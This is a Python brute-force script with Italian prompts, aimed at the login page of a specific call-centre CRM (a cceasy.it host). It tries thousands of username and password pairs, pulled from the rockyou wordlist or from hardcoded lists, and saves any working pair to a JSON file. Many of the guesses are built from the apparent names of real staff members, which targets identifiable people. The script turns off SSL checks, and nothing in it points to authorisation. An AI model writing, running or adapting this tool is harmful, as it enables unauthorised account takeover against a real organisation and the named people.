# coord_brute.py
import asyncio
import aiohttp
import json
from pathlib import Path
import urllib.request

async def scarica_wordlist(url, path):
    if Path(path).exists():
        print(f"[*] Wordlist già presente: {path}")
        return True
    print(f"[*] Scaricamento {url}...")
    try:
        urllib.request.urlretrieve(url, path)
        print(f"[+] Scaricata: {path}")
        return True
    except Exception as e:
        print(f"[!] Errore download: {e}")
        return False

async def try_login(session, username, password):
    try:
        async with session.post(
            "https://sun4all3.cceasy.it:8977/CRM/login",
            data={
                "extension": "372",
                "phoneVersion": "1.1.61",
                "login": username,
                "password": password
            },
            ssl=False,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as resp:
            text = await resp.text()
            if "Login non valido" not in text and resp.status == 200:
                return True
    except:
        pass
    return False

async def brute_coord():
    print("Scegli come caricare le password:")
    print("  1) Rockyou (scaricamento automatico, ~14M password)")
    print("  2) Password comuni (già incluse, ~70 password)")
    print("  3) File wordlist personalizzato")
    scelta = input("Scelta [1/2/3]: ").strip()
    
    passwords = []
    
    if scelta == "1":
        url = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
        path = "rockyou.txt"
        ok = await scarica_wordlist(url, path)
        if ok:
            with open(path, 'r', encoding='latin-1', errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
        else:
            print("[!] Fallito download, uso password comuni")
            passwords = [
                "admin", "password", "123456", "12345678", "qwerty",
                "admin123", "password123", "admin2024", "admin2025", "admin2026",
                "coord", "COORD", "coordinatore", "COORDINATORE",
                "cceasy", "CCEASY", "sun4all", "SUN4ALL",
                "1234", "0000", "1111", "9999",
                "root", "toor", "manager", "supervisor",
                "passw0rd", "Passw0rd", "P@ssw0rd",
                "test", "TEST", "user", "USER",
                "call", "CALL", "agente", "AGENTE",
                "operatore", "OPERATORE", "direttore", "DIRETTORE",
                "password1", "Password1",
                "cceasy2023", "cceasy2024", "cceasy2025", "cceasy2026",
                "coordinator", "COORDINATOR",
                "administrator", "Administrator",
                "welcome", "Welcome", "WELCOME",
                "changeme", "ChangeMe",
                "default", "Default",
                "pass", "Pass"
            ]
    
    elif scelta == "2":
        passwords = [
            "admin", "password", "123456", "12345678", "qwerty",
            "admin123", "password123", "admin2024", "admin2025", "admin2026",
            "coord", "COORD", "coordinatore", "COORDINATORE", "Coordinatore1","Coordinatore123",
            "Coordinatore1234", "Coordinatore12345", "Coordinatore234", "Coordinatore456",
            "cceasy", "CCEASY", "sun4all", "SUN4ALL", "SUN4ALL12345", "SUN4ALL123",
            "SUN4ALL25!", "Sun4all12345", "Sun4all25!", "Sun4all123",
            "1234", "0000", "1111", "9999",
            "root", "toor", "manager", "supervisor",
            "passw0rd", "Passw0rd", "P@ssw0rd",
            "test", "TEST", "user", "USER",
            "call", "CALL", "agente", "AGENTE",
            "operatore", "OPERATORE", "direttore", "DIRETTORE",
            "password1", "Password1","LorenaAcanfora","LorenaAcanfora1","LorenAcanfora","Lorena1","LORENA1",
            "cceasy2023", "cceasy2024", "cceasy2025", "cceasy2026",
            "coordinator", "COORDINATOR",
            "administrator", "Administrator",
            "welcome", "Welcome", "WELCOME",
            "changeme", "ChangeMe",
            "default", "Default",
            "pass", "Pass", "Lorena" , "Lorena12345", "LORENA123", "LORENA12345",
            "Santiago19@", "Sun4all001@","Sun4all001@",
            "Sun4All001@","Sun4all25!","Sun4All25!","Santiago19@","admin","password","123456","12345678","qwerty",
            "admin123","password123","admin2024","admin2025","admin2026",
            "coord","COORD","coordinatore","COORDINATORE","cceasy","CCEASY",
            "sun4all","SUN4ALL","1234","0000","1111","9999","root","toor",
            "manager","supervisor","passw0rd","Passw0rd","P@ssw0rd","test",
            "TEST","user","USER","call","CALL","agente","AGENTE",
            "operatore","OPERATORE","direttore","DIRETTORE",
            "password1","Password1","cceasy2023","cceasy2024",
            "cceasy2025","cceasy2026","coordinator","COORDINATOR",
            "administrator","Administrator","welcome","Welcome",
            "WELCOME","changeme","ChangeMe","default","Default",
            "pass","Pass","COORD","COORD1","COORD2","COORD3",
            "COORD12","COORD123","COORD124","COORD125","COORD126",
            "COORD12345","COORD123","COORD1234","COORD12345",
            "coord1","coord2","coord3","coord12","coord","coord123",
            "coord1234","coord12345","LORENA123","LORENA124",
            "LORENA123","LORENA1234","LORENA12345","MENA123",
            "MENA1234","MENA12345","EMMA123","EMMA1234",
            "EMMA12345","LISA123","LISA1234","LISA12345",
            "LOREDANA123","LOREDANA1234","LOREDANA12345",
            "LORENA123","LORENA1234","LORENA12345",
            "COORD123","COORD1234","COORD12345",
            "EMMA123","EMMA1234","EMMA12345",
            "MENA123","MENA1234","MENA12345",
            "LISA123","LISA1234","LISA12345",
            "LOREDANA123","LOREDANA1234",
            "LOREDANA12345","PAPPACENA123",
            "PAPPACENA1234","PAPPACENA12345","TRIMARCO123",
            "TRIMARCO1234","TRIMARCO12345","ZARRA123",
            "ZARRA1234","ZARRA12345","MANCIURIA123",
            "MANCIURIA1234","MANCIURIA12345","LORENA A.","LORENA",
            "LORENA PAPPACENA","LORENA T.","COORD P.",
            "COORD","C.O.O.R.D.","EMMA Z.","EMMAZARRA",
            "EMMA ZARRA","EMMA P.","MENA P.","MENAP.",
            "MENA PAPPACENA","MENAP","MENA T.",
            "MENA TRIMARCO","MENAT","LISA DL.","LISA DI LORENZO",
            "LISADL","LISA D.","LOREDANA M.",
            "LOREDANAMANCIURIA","LOREDANA MANCIURIA",
            "LOREDANAM","L. MANCIURIA",
        ]
    
    elif scelta == "3":
        path = input("Percorso wordlist: ").strip()
        with open(path, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()]
    
    else:
        print("[!] Scelta non valida")
        return
    
    print(f"[*] Password caricate: {len(passwords)}")
    
    username_variants = [
        "coord", "COORD", "Coord",
        "coordinatore", "COORDINATORE", "Coordinatore",
        "coordinator", "COORDINATOR", "Coordinator",
        "coord.", "COORD.", "Coord.",
        "coord1", "COORD1", "coord0", "COORD0",
        "coord2023", "COORD2023", "coord2024", "COORD2024",
        "coord2025", "COORD2025", "coord2026", "COORD2026",
        "coordinatore1", "COORDINATORE1",
        "cd", "CD","Lorena","LorenaAcanfora","LorenaAcanfora1","LorenAcanfora","Lorena1","LORENA1",
        "admin", "password", "123456", "12345678", "qwerty",
        "admin123", "password123", "admin2024", "admin2025", "admin2026",
        "coord", "COORD", "coordinatore", "COORDINATORE", "Coordinatore1","Coordinatore123",
        "Coordinatore1234", "Coordinatore12345", "Coordinatore234", "Coordinatore456",
        "cceasy", "CCEASY", "sun4all", "SUN4ALL", "SUN4ALL12345", "SUN4ALL123",
        "SUN4ALL25!", "Sun4all12345", "Sun4all25!", "Sun4all123",
        "1234", "0000", "1111", "9999",
        "root", "toor", "manager", "supervisor",
        "passw0rd", "Passw0rd", "P@ssw0rd",
        "test", "TEST", "user", "USER",
        "call", "CALL", "agente", "AGENTE",
        "operatore", "OPERATORE", "direttore", "DIRETTORE",
        "password1", "Password1",
        "cceasy2023", "cceasy2024", "cceasy2025", "cceasy2026",
        "coordinator", "COORDINATOR",
        "administrator", "Administrator",
        "welcome", "Welcome", "WELCOME",
        "changeme", "ChangeMe",
        "default", "Default",
        "pass", "Pass", "Lorena" , "Lorena12345", "LORENA123", "LORENA12345",
        "Santiago19@", "Sun4all001@","Sun4all001@",
        "Sun4All001@","Sun4all25!","Sun4All25!","Santiago19@","admin","password","123456","12345678","qwerty",
        "admin123","password123","admin2024","admin2025","admin2026",
        "coord","COORD","coordinatore","COORDINATORE","cceasy","CCEASY",
        "sun4all","SUN4ALL","1234","0000","1111","9999","root","toor",
        "manager","supervisor","passw0rd","Passw0rd","P@ssw0rd","test",
        "TEST","user","USER","call","CALL","agente","AGENTE",
        "operatore","OPERATORE","direttore","DIRETTORE",
        "password1","Password1","cceasy2023","cceasy2024",
        "cceasy2025","cceasy2026","coordinator","COORDINATOR",
        "administrator","Administrator","welcome","Welcome",
        "WELCOME","changeme","ChangeMe","default","Default",
        "pass","Pass","COORD","COORD1","COORD2","COORD3",
        "COORD12","COORD123","COORD124","COORD125","COORD126",
        "COORD12345","COORD123","COORD1234","COORD12345",
        "coord1","coord2","coord3","coord12","coord","coord123",
        "coord1234","coord12345","LORENA123","LORENA124",
        "LORENA123","LORENA1234","LORENA12345","MENA123",
        "MENA1234","MENA12345","EMMA123","EMMA1234",
        "EMMA12345","LISA123","LISA1234","LISA12345",
        "LOREDANA123","LOREDANA1234","LOREDANA12345",
        "LORENA123","LORENA1234","LORENA12345",
        "COORD123","COORD1234","COORD12345",
        "EMMA123","EMMA1234","EMMA12345",
        "MENA123","MENA1234","MENA12345",
        "LISA123","LISA1234","LISA12345",
        "LOREDANA123","LOREDANA1234",
        "LOREDANA12345","PAPPACENA123",
        "PAPPACENA1234","PAPPACENA12345","TRIMARCO123",
        "TRIMARCO1234","TRIMARCO12345","ZARRA123",
        "ZARRA1234","ZARRA12345","MANCIURIA123",
        "MANCIURIA1234","MANCIURIA12345","LORENA A.","LORENA",
        "LORENA PAPPACENA","LORENA T.","COORD P.",
        "COORD","C.O.O.R.D.","EMMA Z.","EMMAZARRA",
        "EMMA ZARRA","EMMA P.","MENA P.","MENAP.",
        "MENA PAPPACENA","MENAP","MENA T.",
        "MENA TRIMARCO","MENAT","LISA DL.","LISA DI LORENZO",
        "LISADL","LISA D.","LOREDANA M.",
        "LOREDANAMANCIURIA","LOREDANA MANCIURIA",
        "LOREDANAM","L. MANCIURIA",
    ]
    
    username_variants = list(dict.fromkeys(username_variants))
    
    total = len(username_variants) * len(passwords)
    print(f"[*] Varianti username: {len(username_variants)}")
    print(f"[*] Totale tentativi: {total}\n")
    
    found = []
    connector = aiohttp.TCPConnector(limit=5, limit_per_host=3)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for idx, username in enumerate(username_variants):
            for pwd_idx, password in enumerate(passwords):
                tentativo = idx * len(passwords) + pwd_idx + 1
                
                if tentativo % 100 == 0:
                    print(f"[*] Progresso: {tentativo}/{total} ({tentativo*100//total}%)")
                
                success = await try_login(session, username, password)
                
                if success:
                    found.append({"username": username, "password": password})
                    print(f"\n{'='*60}")
                    print(f"[!!!] TROVATO: {username}:{password}")
                    print(f"{'='*60}")
                    
                    with open("coord_trovato.json", "w") as f:
                        json.dump(found, f, indent=2)
                    
                    scelta = input("\n[Trovato! Fermarsi? (1) SI (2) NO]: ").strip()
                    if scelta != "2":
                        print_results(found)
                        return
    
    print("\nNiente trovato.")
    if found:
        print_results(found)

def print_results(found):
    print("\n" + "="*60)
    print("RISULTATI:")
    for f in found:
        print(f"  ✅ {f['username']}:{f['password']}")
    with open("coord_trovato.json", "w") as f:
        json.dump(found, f, indent=2)
    print(f"\n[+] Salvato in coord_trovato.json")
    print("="*60)

if __name__ == "__main__":
    asyncio.run(brute_coord())
